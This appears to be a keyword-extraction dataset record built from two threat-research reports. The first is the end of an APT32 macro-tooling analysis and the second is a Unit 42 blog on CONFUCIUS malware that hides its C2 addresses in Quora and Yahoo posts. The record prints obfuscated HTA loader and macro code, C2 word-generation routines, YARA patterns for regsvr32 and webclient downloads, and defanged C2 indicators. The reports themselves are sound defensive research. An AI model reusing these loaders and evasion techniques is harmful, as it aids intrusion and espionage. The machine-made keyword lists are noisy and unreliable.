imply, and did the developer premeditate the consonants to appear like a particular language? If so, which one? Would Vietnamese be a baseless guess? Or maybe it's random copypasta? Maybe we will never know.ObfuscationHelper declaring the string arraysprivate static readonly string[] VOWELS = new string[] { ""a"", ""e"", ""i"", ""o"", ""u"" }; private static readonly string[] CONSONANTS_1 = new string[] { ""b"", ""c"", ""d"", ""f"", ""g"", ""h"", ""j"", ""k"", ""l"", ""ch"", ""gh"", ""qu"", ""sh"", ""th"", ""wh"", ""m"", ""n"", ""p"", ""q"", ""r"", ""s"", ""t"", ""v"", ""w"", ""x"", ""y"", ""z"", ""ch"", ""gh"", ""qu"", ""sh"", ""th"", ""wh"" }; private static readonly string[] CONSONANTS_2 = new string[] { ""c"", ""d"", ""m"", ""n"", ""p"", ""ng"", ""s"", ""t"", ""w"", ""ng"" };Cloning new arrays forObfuscationHelper()public ObfuscationHelper() {this.m_vowels = CloneStringArray(VOWELS); this.m_consonants_1 = CloneStringArray(CONSONANTS_1); this.m_consonants_2 = CloneStringArray(CONSONANTS_2);}Example of a function using the consonant and vowel arrays to build a randomized word.public string RandomSingleWord(bool autoUpper) {URandom rand = new URandom(); int idx1 = rand.Next(0, this.m_consonants_1.Length); int idx2 = rand.Next(0, this.m_vowels.Length); int idx3 = rand.Next(0, this.m_consonants_2.Length);string s = this.m_consonants_1[idx1]; if (autoUpper) {5704/2022The origin story of APT32 macros THREAT RESEARCH REPORTstring u = s.Substring(0, 1).ToUpper(); s = u + s.Substring(1);} s += this.m_vowels[idx2]; s += this.m_consonants_2[idx3]; return s;}The reason this ObfuscationHelper is pertinent to the discussion is that APT32/OceanLotus clusters are famous for similar obfuscation and encoding, and they are likely using similar techniques still today. In 2018, ESET detailed a piece of malware with a library HTTPprov designed to aid in string generation while (buff < buffEnd){b=genRand(16); if (b[0] - 0x50 > 0x50)t=0;else*buf++= UPPER(vowels[b[1] % 5]);v=consonants[b[1]%21]); if (!t)v=UPPER(v);*buff++= v; if (v!=’h’ && b[2] - 0x50 < 0x50)*buff++= ‘h’; *buff++= vowels[b[4] % 5];if (b[5] < 0x60)*buff++= vowels[b[6] % 5]; *buff++= consonants[b[7] % 21];if (b[8] < 0x50)*buff++= vowels[b[9] % 5]; *buff++= ‘-’;}; *buff=’\0’;In the 2019 OceanLotus report by RedDrip Team, we see this HTA file feel as our HTA test file generated with Obfuscation Helper. This is not surprising, because our5804/2022The origin story of APT32 macros THREAT RESEARCH REPORTShellcodeLoader shows along with this attack as well, but it’s still nice to see all of these tools <script language=""vbscript""> on erROR RESUMe NexT …FUNctIon QuangGhut ( BongHim ) set QuangGhut= CreAteobjECT (BongHim ) enD FUnCtIon…FuNCtiOn NingGhac(ThepGhotChudVong,HengThew ,ChedBom ,PitWhiwVeng )SeT DapVen = qUAnggHUt ( ""System.Text.ASCIIEncoding"")sEt MicSotThasGaw = quAnGghuT ( ""System.Security.Cryptography.FromBase64Transform"")SEt QuengZiwGhat = QUANGgHUt ( ""System.IO.MemoryStream"")QuengZiwGhat.Write MicSotThasGaw.TransformFinalBlock ( DapVen.GetBytes_4 (ThepGhotChudVong), 0 , HengThew) , 0 , ChedBomQuengZiwGhat.Position = PitWhiwVengSeT NingGhac = QuengZiwGhat eND fUNCtIonWhen we execute that HTA in a virtual machine, out pops a backdoor, fresh as a newborn fawn. The backdoor makes HTTP POST requests with URIs that appear to contain fake, randomized words likely using some variation of the custom HTTPprov library previously described by ESET.HTTP POST requests with randomized word URIs fromthe backdoor in 2019 OceanLotus HTA file THREAT RESEARCH REPORTA 2019 blog by NSFOCUS examines this exact backdoor and demonstrates the URI generation algorithm generating the vowels and consonants array as aAeiou and aBcdyzfghjklpwr, respectively. This technique by HTTPprov is clearly different from the approach in the ObfuscationHelper project, yet these methods show the developers behind APT32 (and OceanLotus) malware kits wish to provide flexible functionalities that create fake, randomized strings that look almost (but not quite) like real words. This is an important piece of tradecraft because it is something we can study and track as the developers evolve the toolset.6004/2022The origin story of APT32 macros THREAT RESEARCH REPORTNSFOCUS depictions of the URI generation algorithmAPT32 then and now The StrikeSuit Gift package of malware is undoubtedly linked to APT32 based on the ShellcodeLoader and the XML timestamps that draw concrete connections to attributed APT32, OceanLotus, Cobalt Kitty, and other monikers for this rampant threat actor. Looking at the obfuscation and randomization tradecraft from StrikeSuit Gift’s ObfuscationHelper, we can see similarities in other OceanLotus projects such as the HTTPprov library that helps generate fake URIs for backdoor C2 schemas.6104/2022The origin story of APT32 macros THREAT RESEARCH REPORTAPT32 has certainly not been sleeping since 2017. Time marches on and a lot has changed. But what has stayed the same? Instead of looking at the actor’s evolution forward in time, we can take stock of the attacks we see in 2022 and connect the dots back to the puzzle pieces of the past. Netskope Threat Labs detailed a 2022 APT32 operation using MHT lure files and C2 via the legitimate web service Glitch.me. The initial lure documents were shipped in a RAR file. Taking a peek at one of these RARs, we can see the last modified time has modernized to the eight-byte Windows FILETIME, so we know the actor is using WinRAR 5  with defaults for high-precision timestamps, just like the rest of us. Inside of an example RAR file for this campaign, we find an MHT file with a .doc extension, and we see that the document has an Alternate Data Stream ZoneId of 2. It's no coincidence that this is the same approach taken in StrikeSuit Gift’s Macros_Builder.Using PowerShell to tease out the ADS Zone Identifier for 2022 MHT … FileName : C:\Users\user\Desktop\HS.doc Stream : Zone.Identifier Length : 24PS C:\Users\user\Desktop> Get-Content C:\Users\user\Desktop\HS.doc -stream Zone.Identifier[ZoneTransfer] ZoneId=2Routine from 2017Macros_Builder\Form1.cs to add ADSZone Identifier for input filesprivate void buttonCreate_Click(object sender, EventArgs e) {if (textBoxADS.Text.Trim().Length <= 0)6204/2022The origin story of APT32 macros THREAT RESEARCH REPORT{MessageBox.Show(""Missing path!""); return;} string StreamName = ""Zone.Identifier""; FileInfo ADSFile = new FileInfo(textBoxADS.Text.Trim()); if (ADSFile.AlternateDataStreamExists(StreamName)) {AlternateDataStreamInfo s = ADSFile.GetAlternateDataStream(StreamName,FileMode.Open);s.Delete();} AlternateDataStreamInfo FileADS = ADSFile.GetAlternateDataStream(StreamName,FileMode.OpenOrCreate);using (FileStream TWriter = FileADS.OpenWrite()) {string ZoneTrust = ""[ZoneTransfer]\r\nZoneId=2""; using(StreamWriter FStreamWriter = new StreamWriter(TWriter)) {FStreamWriter.AutoFlush = true; FStreamWriter.Write(ZoneTrust);}}MessageBox.Show(""Alternative Data Stream OK!"", ""Complete!"", MessageBoxButtons.OK,MessageBoxIcon.Information);}Diving further into Glitch.me campaign samples, in one MHT, we extract and base64 decode the content of Content-Location: file:///C:/604BB24E/DeliveryInformation_files/editdata.mso to arrive at an ActiveMime blob, which we can decode with oledump and then view the VB macro content.C:\Users\user\Desktop>oledump ActiveMime.bin1: 442 'PROJECT' 2: 41 'PROJECTwm' 3: M 13478 'VBA/ThisDocument' 4: 3452 'VBA/_VBA_PROJECT' 5: 633 'VBA/dir'6304/2022The origin story of APT32 macros THREAT RESEARCH REPORTThe modern macro content is annoyingly encoded with randomized function and parameter strings and tedious char evaluations of octal, hex, and decimal added and subtracted together.MA5SIed2hG218yR = Chr((121 - 0o164 + 0x50)) + Chr((143 + 0xD2 - 0xEE)) We can do a quick check of these using Python. First we find and replace all “&0” and “&H” and replace those with 0o and 0x prefixes that are Python friendly. Replace any &s with +s and now we’re cookin with fire. This is the exact approach that researcher Gustavo Palazolo took in this script to help decode the macro strings, but we’re demonstrating it here for extra fun. Next, just test out a couple expressions at the Python CLI.>>> z = ""121 - 0o164 + 0x50"" >>> print(chr(evaluate(z))) U >>> MA5SIed2hG218yR = chr(evaluate(""121 - 0o164 + 0x50"")) + chr(evaluate(""143 + 0xD2 - 0xEE"")) + chr(evaluate(""0xC0 - 0xB3 + 0o130"")) + chr(evaluate(""147 - 156 + 0o173"")) + chr(evaluate(""13 + 0x13"")) + chr(evaluate(""0x48 - 0o222 + 0o213"")) + chr(evaluate(""0o212 - 0xAF + 0o210"")) + chr(evaluate(""0x9F + 0xA0 - 220"")) + chr(evaluate(""0o220 + 88 - 0o171"")) + chr(evaluate(""113 + 0x4"")) + chr(evaluate(""170 - 0x8F + 83"")) + chr(evaluate(""196 - 0x50"")) >>> print(MA5SIed2hG218yR) User AccountNow that we know this works, one might run through and clean up the obfuscated VB into more of a human-readable text and begin to tease out the innards of the macro.Private Sub ePtqP5mQjVHX4H()On Error Resume Next aGJ5m9Jtam95y = ""Microsoft Outlook Sync"" V9sMn9FaY = ""TL284151.doc"" Dim MA5SIed2hG218yR As String MA5SIed2hG218yR = ""User Account"" RCGt2dyOgy5 MA5SIed2hG218yR = MA5SIed2hG218yR + ""Pictures"" E0xI2h2kKxi9ra = ""background.dll"" w2cHY5K1n = ""\guest.bmp""6404/2022The origin story of APT32 macros THREAT RESEARCH REPORTyR1QBm2tf10 = ThisDocument.FullName MA5SIed2hG218yR = ""\Microsoft\"" + MA5SIed2hG218yR + w2cHY5K1n MA5SIed2hG218yR = Environ(""AllUsersProfile"") + MA5SIed2hG218yR kMcnWThP5l = Environ(""AllUsersProfile"") + ""\"" + aGJ5m9Jtam95y Dim b6Ot02TnO5CCSH8() As String b6Ot02TnO5CCSH8 = Split(kMcnWThP5l, ""\"") cache = b6Ot02TnO5CCSH8(LBound(b6Ot02TnO5CCSH8)) For PxSn9cV7c = LBound(b6Ot02TnO5CCSH8) + 1 To UBound(b6Ot02TnO5CCSH8)cache = cache + ""\"" + b6Ot02TnO5CCSH8(PxSn9cV7c) MkDir cacheEven when partially decoded, this payload macro might appear to have little to do with StrikeSuit Gift Macros_Builder source code. But our guess is that if someone analyzes enough of the new APT32 macros, they will see similarities in how the malware developer uses VB to write binary data, perform randomized string generation, or do error handling. It's not unreasonable to imagine that these 2022 MHT and macro payloads were created with heavily modernized versions of the tooling found throughout the StrikeSuit Gift package. The final backdoor from this elaborate 2022 campaign purportedly uses a Windows Scheduled Task for persistence. Some things never change.6504/2022The origin story of APT32 macros THREAT RESEARCH REPORTEpilogue6604/2022The origin story of APT32 macros THREAT RESEARCH REPORTIn our analysis of StrikeSuit Gift, we did a quick and dirty inspection of the source code, we took a gander at the macro builders, and we sifted through the malware and the slew of artifacts that came along with it. We observed the evolutionary timeline of several interdependent code projects and we established connections to the threat actor APT32. Part of the thrill of threat analysis is that most investigations end not with final answers but with new questions. We dusted off this archaic tome of APT32 macros, and through our analysis, we discovered fresh starting points for tracking the threat actor into the future. Intrusion operations come and go, but threat actors are forever. We plan to continue sharing unique analysis to help advance the field of threat intelligence but also to engage and inspire the next generations of threat analysts. We hope that this origin story and exposé was informative, or at least a little bit fun. Holler if you’ve got questions, comments, corrections, or something to add; otherwise, see you around the internet.6704/2022The origin story of APT32 macros THREAT RESEARCH REPORTAppendix6804/2022The origin story of APT32 macros THREAT RESEARCH REPORTYARA rules These precise YARA rules may help bubble up files related to APT32 and StrikeSuit Gift.rule APT32_WebBuilder_ShellcodeLoader_L_dll_timestmp {meta:author = ""Stairwell"" ref = ""P17028 - StrikeSuit Gift - Office Macro Type1\\Reference\\WebBuilder\\ShellcodeLoader\\Test\\bin\\Release\\L.dll""condition:pe.timestamp == 1242474426} rule APT32_MacrosBuilder_add_schedule_vba_txt_date {meta:author = ""Stairwell"" ref = ""P17028 - StrikeSuit Gift - Office Macro Type1\\Reference\\Macros_Builder\\Macros_Builder\\Resources\\add_schedule_vba.txt""strings:$a = ""2016-06-02T11:13:39.1668838"" ascii widecondition:$a} rule APT32_MacrosBuilder_add_schedule_vba_txt_startboundary {meta:author = ""Stairwell"" ref = ""P17028 - StrikeSuit Gift - Office Macro Type1\\Reference\\Macros_Builder\\Macros_Builder\\Resources\\add_schedule_vba.txt""strings:$a = ""2016-06-02T11:12:49.4495965"" ascii widecondition:$a} rule APT32_MacrosBuilder_add_schedule_vba_txt_regsvr32_to_uri {meta:author = ""Stairwell"" ref = ""P17028 - StrikeSuit Gift - Office Macro Type1\\Reference\\Macros_Builder\\Macros_Builder\\Resources\\add_schedule_vba.txt""strings:$a = ""\""\""\\\""\""regsvr32.exe\\\""\"" /s /n /u /i:http""condition:6904/2022The origin story of APT32 macros THREAT RESEARCH REPORT$a} rule APT32_ActiveMime_Lure {meta:ref = ""url"" courtesy_of = ""@Mandiant @TekDefense and @itsreallynick""strings:$a = ""office_text"" ascii wide $b = ""schtasks /create tn"" nocase ascii wide $c = ""scrobj.dll"" nocase ascii wide $d = ""new-object net.webclient"" ascii wide $e = ""GetUserName"" ascii wide $f = ""WSHnet.UserDomain"" ascii wide $g = ""WSHnet.UserName"" ascii widecondition:4 of them} rule APT32_Macros_Builder_add_schedule_vba_SpawnBase63 {meta:author = ""Stairwell"" ref = ""See HtaDotNetBuilder and HtaDotnet.cs""strings:$a = ""SpawnBase63"" nocase ascii wide $b = ""SpawnBase63"" base64 base64wide $c = ""SpawnBase63"" xor(0x01-0xff)condition:any of them}These broad YARA rules may help surface or identify files with exported XML scheduled tasks.rule TTP_XML_Scheduled_Task_Date_pcre {meta:author = ""Stairwell"" desc = ""XML Scheduled task strings with a Date that has seven digits of precision, sinceno reasonable human would type that, we can guess that these are likely exported from Windows Task Scheduler.""strings:$xml = ""<?xml version=\""""7004/2022The origin story of APT32 macros THREAT RESEARCH REPORT$task_xml = ""<Task version=\"""" $pcre = /<Date>[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}\.[0-9]{7}<\/Date>/nocase ascii widecondition:all of them} rule TTP_XML_Scheduled_Task_StartBoundary_pcre {meta:author = ""Stairwell"" desc = ""XML Scheduled task strings with a Date that has seven digits of precision, sinceno reasonable human would type that, we can guess that these are likely exported from Windows Task Scheduler.""strings:$xml = ""<?xml version=\"""" $task_xml = ""<Task version=\"""" $pcre =/<StartBoundary>[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}\.[0-9]{7}<\/StartBoundary>/ nocase ascii widecondition:all of them}VTI queries Malware developers may inadvertently leak source code packages to VirusTotal, and you can find them by searching for odd bundles with artifacts of the development process. Try different artifacts and different packaging types.content:"".csproj"" type:rar positives:1+ fs:2022-04-01+content:"".sln"" type:rar positives:1+ fs:2022-04-01+content:"".suo"" type:rar positives:1+ fs:2022-04-01+content:"".pdb"" type:rar positives:1+ fs:2022-04-01+content:"".pyc"" type:rar positives:1+ fs:2022-04-01+7104/2022The origin story of APT32 macros THREAT RESEARCH REPORT“Indicators” Look, it’s kind of a pain to give all the atomic indicators to you in a way that is easy or sensibly useful. If we print out just MD5s, someone will ask for SHA256s, and if we give SHA256s, someone else will ask for SHA387s. This isn’t the type of report that is really about the indicators anyway, as many of them are so old it doesn't really matter. If you want to take a gander at the StrikeSuit Gift tooling, we provide links below. Jump in and get dirty! Looking at the source code is fun and instructive. If you are an intelligence analyst and trying to play the game of connect the dots for purposes of attribution, we recommend you start with the main StrikeSuit Gift RAR file and do your own hashing and IOC extraction from there. StrikeSuit Gift RAR file See it in MalShare See it in VTLinks and referencesAPT32 by year A selection of APT32 associated reports by year.Year20172018NotesApr 28, Kaspersky   DNS Tunneling May 17, Mandiant   APT32 Cyber Espionage Alive and Well May 24, Cybereason   Operation Cobalt Kitty by OceanLotus Jun 22, Palo Alto Networks   OceanLotus macOS backdoor Nov 11, Volexity   OceanLotus Mass Digital SurveillanceMar 01, ESET   OceanLotus Old techniques, new backdoor Apr 14, Trend Micro   New OceanLotus MacOS Backdoor Oct 10, BlackBerry  Cylance)   Spy RATs of OceanLotus7204/2022The origin story of APT32 macros THREAT RESEARCH REPORT2019202020212022Feb 01, Palo Alto Networks   OceanLotus Downloader KerrDown Mar 20, ESET   Keeping up with OceanLotus decoys Jul 25, NSHC   Growth of Sector F01 Espionage Apr 09, ESET   OceanLotus macOS Malware Update Apr 24, Checkpoint   Deobfuscating APT32 Flow Graphs Jun 20, Qi Anxin   OceanLotus Targets Environmental Group in Vietnam Jul 01, BlackBerry  Cylance)   Ratsnif New Network Vermin from OceanLotus Aug 01, BlackBerry  Cylance)   OceanLotus StenographyApr 22, Mandiant   APT32 Targeting Wuhan and CN Gov on COVID 19 Nov 06, Volexity   OceanLotus Espionage Through Fake Websites Nov 30, Microsoft   BISMUTH Leverages Coinminers to Fly Under RadarFeb 24, Amnesty International   Vietnamese Human Rights Defenders TargetedJan 11, Netskope   Abusing MS Office Using Web Archive Files Jan 20, Qi Anxin   OceanLotus Attack Using Glitch PlatformOffice macros● url ● url Studio 2022● url● url● Interop Assemblies for Officeurl 20227304/2022The origin story of APT32 macros THREAT RESEARCH REPORTFor more information on the intelligence provided in this report,contact us at threatresearch@stairwell.comStairwell helps organizations take back the cybersecurity high ground with solutions that attackers can't evade. Its flagship product, the Inception platform, empowers security teams to outsmart any attacker. Stairwell is composed of security industry leaders and engineers from Google and is backed by Sequoia Capital, Accel, and Gradient Ventures. stairwell.com7404/2022 ","{'phrases': ['APT32', 'enD', 'Office', 'the document', 'documents', 'VB macros', 'The StrikeSuit Gi', 'the malware', ' 4', 'PowerShell', 'Script', 'scheduled tasks', 'additional payloads', ' 5', 'Shellcode', 'techniques', 'final backdoor', 'RAT', 'Command', 'data', 'StrikeSuit Gift macros', 'System', 'log', '10', 'randomized strings', 'words', 'detection'], 'target': 'APT32; enD; Office; the document; documents; VB macros; The StrikeSuit Gi; the malware;  4; PowerShell; Script; scheduled tasks; additional payloads;  5; Shellcode; techniques; final backdoor; RAT; Command; data; StrikeSuit Gift macros; System; log; 10; randomized strings; words; detection.'}"
the attackers; phishing emails; targets; the target; the attachment; Exploit; a DNS lookup; DNS requests; the malware; the RAT; data; the attackers; the target; the attack; a legitimate web service; Quora; The malware; DNS requests; the domains; the attackers; IP addresses.,"["" 1. The malware is distributed via phishing emails containing links or attachments. The lures are customized for the target (event invites, software updates, etc.). 2. If the attachment is opened or link clicked, the first stage malware (dropper) is installed on the system. 3. The dropper decrypts and executes the main CONFUCIUS malware payload. 4. CONFUCIUS queries posts on Yahoo Answers or Quora to extract keywords based on predefined markers. 5. It uses the keywords to construct or decode the IP address of the command and control server. 6. CONFUCIUS contacts the C2 server to receive commands and exfiltrate data from the compromised system. 7. The C2 server can send further commands to control the system, spread laterally, and collect sensitive documents and data. 8. Exfiltrated data may be compressed and encrypted before being sent to the attacker's remote server. 9. The process allows the malware to bypass blocking of known malicious domains by using legitimate websites. ""]","Extract the keywords: 5/29/2019Confucius Says Malware Families Get Further By Abusing Legitimate WebsitesConfucius Says…Malware Families Get Further By Abusing Legitimate Websitesunit42.paloaltonetworks.com/unit42-confucius-says-malware-families-get-further-by-abusing-September 28, 2016legitimate-websites By Tom Lancaster and Micah Yates Introduction When malware wants to communicate home, most use domain names, allowing them to resolve host names to IP addresses of their servers. In order to increase the likelihood of their malware successfully communicating home, cyber espionage threat actors are increasingly abusing legitimate web services, in lieu of DNS lookups to retrieve a command and control address. This negates the requirement to make DNS requests for domains that may be considered malicious and are therefore blocked. For attackers, that’s an advantage because it allows their initial communications channel to be obscured amongst other trafﬁc to legitimate services.This blog post examines two similar malware families that utilize the aforementioned technique to abuse legitimate websites, their connections to each other, and their connections to known espionage campaigns. The ﬁrst of which we call ‘CONFUCIUS_A’, a malware family that has links to a series of attacks associated with a backdoor attack method commonly known as SNEEPY (aka ByeByeShell) ﬁrst reported by Rapid7 in 2013. The second of which we call ‘CONFUCIUS_B’, which has a loose link to the series of attacks associated with Operation Patchwork and The Hangover Report. Confucius says… resolve your command and control domains using web services. In 2013, Rapid7 reported on a series of relatively amateur attacks against Pakistani targets. For a long time after the report was published, little changed in how the attackers operated. Although many of the attacks we see today from the group remain the same, we began observing a new backdoor, CONFUCIUS_A, being dropped by the attackers starting in early 2014. Speciﬁcally, the command and control addresses used across multiple SNEEPY samples were being used by CONFUCIUS_A samples. In the case of just one or two samples, without temporal overlap, this may not be deemed a strong link to CONFUCIUS_A, however it occurs across a great deal of the infrastructure we have observed.In most cases where we have been able to identify the droppers, the attack begins with an executable ﬁle being sent directly to targets via e-mail. Occasionally the attackers leverage builders for known document exploits, but most of the time they still use self- extracting binaries. The themes of the phishing e-mails vary according to the target, but invariably the ﬁle is compiled with an icon that matches the expected content. Examples of the themes used in attacks using CONFUCIUS_A and the surrounding cluster of activity include:url Says Malware Families Get Further By Abusing Legitimate WebsitesInvitations to events relevant to the recipients Pornographic material Fake updates to popular software products News content Political contentWe have limited evidence of who the targets are, but they appear to primarily be based in the Middle East and parts of Asia, with a focus on Pakistan. In addition to those targets, there are occasional targets seen at enterprises across the globe.Early samples of the CONFUCIUS_A malware did not use any legitimate web services for DNS resolution; however, more recent samples of the CONFUCIUS_A malware use a range of legitimate web services to resolve command and control addresses, the highest proﬁle of which are Yahoo and Quora. The malware was given its name based on the content of one of the ﬁrst pages we saw being retrieved to determine a command and control address, which is written in the style of a ‘Confucius says’ joke. See Figure 1.Figure 1 – An example of Quora page contacted by the malware.Sometimes malware communicates with legitimate web services simply to perform a connectivity check, but in this case the page was too speciﬁc to suggest that was what the attackers were doing. So we decided to investigate how the malware processed the resulting content. If this is the question, what is the answer? For the purposes of illustrating how the command and control address is decoded we will look at the sample with SHA256: sample of the malware requests the page shown below in order to determine what IP to POST to.url Says Malware Families Get Further By Abusing Legitimate WebsitesFigure 2 – The Quora page contacted by the malware to retrieve its command and control address.Reading through the answer, it all makes sense until the section highlighted is reached. By looking at the underlying code, we found that CONFUCIUS_A is looking for keywords between the phrases “suggested options are” and “hope it will help” and decoding the interim phrase. The decoding is done using a simple lookup table, as shown in Figure 3.Figure 3 – A memory dump from a CONFUCIUS_A sample showing the lookup table used by the malware, the table is truncated for presentation purposes.url Says Malware Families Get Further By Abusing Legitimate WebsitesThe lookup table begins with the marker for the beginning and end of the useful content, and then contains 255 words, each of which corresponds to a number (for example prudent == 255). Using this lookup table in memory it can then derive the command and control address from the text between the markers, “ﬁll plate clever road” becomes 91.210.107[.]104.Figure 4 – HTTP POST request made to command and control server Additional malware contacting Yahoo and Quora During our investigation into the CONFUCIUS_A malware, one of the ways we tried to identify variations of the backdoor was by looking for samples that communicated with the same legitimate services as known CONFUCIUS_A samples. In doing so, we encountered another set of samples exhibiting very similar behavior, which we refer to as CONFUCIUS_B, due to their similarity, and their likely similar origins. Unfortunately, we have fewer details about how CONFUCIUS_B malware is delivered or the targets it intends to hit.For the purposes of this write-up we will follow the chain of dropped ﬁles from the dropper with SHA256: At ﬁrst glance CONFUCIUS_B looks very similar to CONFUCIUS_A, and they are also packaged in plain SFX binary ﬁles. The CONFUCIUS_B executable is disguised as a PowerPoint presentation, using a Right-To-Left-Override (RTLO) trick and a false icon. When executed, the self-extracting RAR package drops four ﬁles to the %AppData% folder, as shown in Figure 5.Figure 5 – The ﬁles dropped by CONFUCIUS_BFancy.vbs executes fancy.bat, which in turn opens the presentation and runs the second stage executable svchost.exe. As with CONFUCIUS_A, the initial beacons from this svchost.exe are also to Yahoo and Quora, but the pages contacted, whilst odd did not contain any obvious markers, rather they appeared to be entirely gibberish:url Says Malware Families Get Further By Abusing Legitimate WebsitesFigure 6 – An exemplary Quora page contacted by the malware.So far, the execution chain, involving an SFX RAR and multiple scripts is similar to some samples of SNEEPY, which we associate with CONFUCIUS_A, but this is where the similarities between CONFUCIUS_A and CONFUCIUS_B begin to diverge. Svchost.exe has a custom obfuscation scheme not seen in CONFUCIUS_A. This obfuscation allows us to quickly identify all of the CONFUCIUS_B variants; their hashes are included at the end of this post. The obfuscation routine is given in Figure 7.url Says Malware Families Get Further By Abusing Legitimate WebsitesFigure 7 – The obfuscation routine shared across all CONFUCIUS_B samples.url Says Malware Families Get Further By Abusing Legitimate WebsitesUnderneath that custom obfuscation lies a UPX packed executable which contains the Yahoo and Quora functionality that originally piqued our interest. After unpacking the UPX code, we began reverse engineering the resulting binary to see how CONFUCIUS_B interacted with the Yahoo and Quora pages it initially requested. We discovered that CONFUCIUS_B pieces together its DNS resolution from keywords in the Yahoo and Quora posts similar to that of CONFUCIUS_A.CONFUCIUS_B takes certain keywords in the Quora and Yahoo pages and applies them to a lookup table in memory. Using that lookup table an IP address to POST to is derived. The way this is done can be seen in a memory dump from the running process when it contacts a relevant address, for example as shown in Figure 8.Figure 8 – A memory dump of a CONFUCIUS_B illustrating the lookup table and initial beacon address.The lookup table takes key words and assigns them numbers, or a ‘.’ character, in order to build an IP address, and is arranged as shown in Table 1.love 7url Says Malware Families Get Further By Abusing Legitimate Websitesnatural .Table 1 – Lookup table used by the malware to determine it’s command and control address.By applying the lookup table to the Quora page shown in Figure 6, we can derive the IP the malware will POST to next for further communications.Using our lookup table, giving us an address of 149.202.110[.]2:This method of substituting words for components of an IP address, and the repeat use of Yahoo and Quora are novel, which suggest it is likely that the same malware author, or group of malware authors, authored both backdoors. Link to Patchwork and test samples The domain “com-account-jfnjkr[.]xyz” is linked to the CONFUCIUS_B attacks as it was a C2 for the sample downloads CONFUCIUS_B. On May 24, 2016, the same domain hosted the sample ﬁle stealer malware associated with the Patchwork attackers, via a shared mutex: Pivoting through samples in Palo Alto Networks AutoFocus, we were able to ﬁnd what appears to be an early test sample of the malware that creates the same mutex; the SHA256 of the sample is believe it is a test sample, as the conﬁgured command and control domain for this sample is ‘breachframework[.]com’. This can also be linked back to known CONFUCIUS_B sample via a shared SSL certiﬁcate. Breachframework[.]com previously 104.23.35[.]15, a known command and control address for CONFUCIUS_B. These relationships are summarized in Figure 9.Figure 9 – An overview of the link to the test infrastructure. Conclusion In this blog post, we discussed two separate malware variations that behave in very similar ways and use similar techniques to acquire a C2 address, with both using Yahoo Answers and Quora to evade traditional mechanisms for blocking command and control domains. Although we cannot link the two clusters of activity by their infrastructure, the technique used to resolve domains is unusual. We also believe that both clusters of activity have links to attacks with likely Indian origins, the CONFUCIUS_A attacks are linked to the use of SNEEPY/BYEBYESHELL and the CONFUCIUS_B have a loose link to Hangover. The two malware families themselves are also very similar, and therefore we think that the shared technique is an indication of a single developer, or development company, behind both CONFUCIUS_A and CONFUCIUS_B. It is likely that the two clusters of activity are operated by two different operators; however, as the command and control infrastructure used by each cluster differs in the choices of hosting providers.Palo Alto Networks AutoFocus customers can further explore these malware families and related campaigns with the tags:Confucious_A SneepyAll samples discussed in the blog and those in the appendix are detected as malicious (early)url Says Malware Families Get Further By Abusing Legitimate Websites2f3005a06cf6819690da987414e7d‐ me-you-like-or-couple-weed-or-hate-weed-with-deedy-love-claggy-1 url hxxps://in.answers.yahoo.com/question/index?qid=20160229024628AA4XQ7r hxxp://www.nefuri.com/hi_is_bingle_hate_and_love_the_green_or_it_ﬁre_couple_ﬁre_tell _me_you_like_or_couple_weed_or_hate_weed_with_deedy_block_claggy_1562153.html hxxp://www.answerlib.org/qv/20160229115557AAXc2Ib.html hxxps://in.answers.yahoo.com/question/index?qid=20160229115557AAXc2Ib hxxps://www.question.com/what-are-the-precautions-for-diphtheria-tetanus-998506.html hxxp://ﬁndnerd.com/list/view/How-to-make-a-simple-settings-page-in-android/15891/ hxxp://able2know.org/topic/312620-1 hxxp://bs71.blog.com/2016/03/01/performing-namaz/ hxxp://www.linkibl.com/l/deﬁne-simple-support-boundary-condition-of-a-beam-solid- hxxp://www.education.com/question/working-model-depict-buoyancy/ hxxp://www.quora.com/Where-can-I-ﬁnd-Port-de-Vaire hxxp://www.ﬁxya.com/support/t25556697-intel_desktop_board_dh67cl_having_vga hxxp://www.education.com/question/scientist-calculate-distance-planets hxxp://technology.blurtit.com/4492774/import-mri-ct-and-microct-data hxxp://bs71.blog.com/2016/03/01/performing-namaz/ hxxp://www.linkibl.com/l/deﬁne-simple-support-boundary-condition-of-a-beam-solid- hxxps://www.quora.com/Is-bingle-hate-and-love-the-green-or-it-ﬁre-couple-ﬁre-tell- me-you-like-or-couple-weed-or-hate-weed-with-deedy-love-claggy-1 hxxps://www.quora.com/How-fertilization-takes-place-in-Plants C2 Addresses: adhath-learning[.]com ns1[.]b3autybab3s[.]com mail[.]cooperednews[.]info ns2[.]cooperednews[.]info ns2[.]softwares-free[.]comurl Says Malware Families Get Further By Abusing Legitimate Websiteswww[.]ﬁerybarrels[.]com ns1[.]cooperednews[.]info znaniye-onlayn[.]com www[.]templetom[.]com ns2[.]didlynews[.]info ns1[.]didlynews[.]info purple-banana[.]com uchitel-nitsa[.]com trk[.]greatleonidas[.]com www[.]cutedazzle[.]com www[.]gallopingroses[.]com ns2[.]b3autybab3s[.]com softwares-free[.]com www[.]romanrugby[.]com ns1[.]softwares-free[.]com jobs[.]undp[.]tangyball[.]com news-letters-4u[.]com www[.]tumblebin[.]comurl Says Malware Families Get Further By Abusing Legitimate Websiteslittle-nuts[.]com ftp[.]wond3rfulworld[.]com blog[.]younghogs[.]com ww2[.]younghogs[.]com www[.]younghogs[.]com ww1[.]younghogs[.]com mx2[.]newstodayreviews[.]com mx1[.]newstodayreviews[.]com mx3[.]newstodayreviews[.]com www[.]onepickle[.]com quicktime[.]softwares-free[.]com ns1[.]bidux[.]com[.]avtofrom[.]us www[.]nophoz[.]com com-account-jfnjkr[.]xyz 104[.]219[.]250[.]204 216[.]189[.]148[.]125 149[.]202[.]110[.]2 104[.]219[.]250[.]205 5[.]135[.]85[.]16 78[.]128[.]92[.]101 206[.]221[.]188[.]98 104[.]232[.]35[.]15 5[.]39[.]23[.]192 95[.]211[.]135[.]167 46[.]165[.]207[.]109 95[.]211[.]38[.]134 46[.]165[.]249[.]223 95[.]211[.]135[.]162 46[.]165[.]207[.]140 46[.]165[.]207[.]120 95[.]211[.]107[.]75 94[.]242[.]219[.]203 95[.]211[.]38[.]133 46[.]165[.]207[.]112 95[.]211[.]3[.]135 91[.]210[.]107[.]107 46[.]165[.]207[.]114 91[.]210[.]107[.]108 95[.]211[.]205[.]142 95[.]211[.]107[.]71 46[.]165[.]207[.]116 95[.]211[.]135[.]168 46[.]165[.]207[.]134url Says 